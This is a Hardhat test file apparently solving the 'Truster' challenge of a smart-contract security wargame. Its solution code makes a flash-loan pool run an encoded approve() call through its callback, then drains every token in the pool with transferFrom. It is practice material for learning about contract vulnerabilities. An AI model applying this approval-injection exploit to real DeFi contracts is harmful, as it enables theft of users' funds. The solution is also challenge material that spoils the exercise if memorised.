const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // const AttackTrusterDeployer = await ethers.getContractFactory("AttackTrusterLenderPool", player);
        // const attackContract = await AttackTrusterDeployer.deploy(pool.address);
        // await attackContract.connect(player).drainPool();

        // await token.transfer(player, TOKENS_IN_POOL);


        /** CODE YOUR EXPLOIT HERE  */

        const AttackTrusterDeployer = await ethers.getContractFactory("AttackTrusterLenderPool", player);
        const attackContract = await AttackTrusterDeployer.deploy(pool.address, token.address);

        // Approve the attacker to spend the tokens in the pool
        const abi = ["function approve(address spender, uint256 amount)"]
        const interface = new ethers.utils.Interface(abi);
        const data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL])

        await attackContract.drainPool(0, player.address, token.address, data);
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

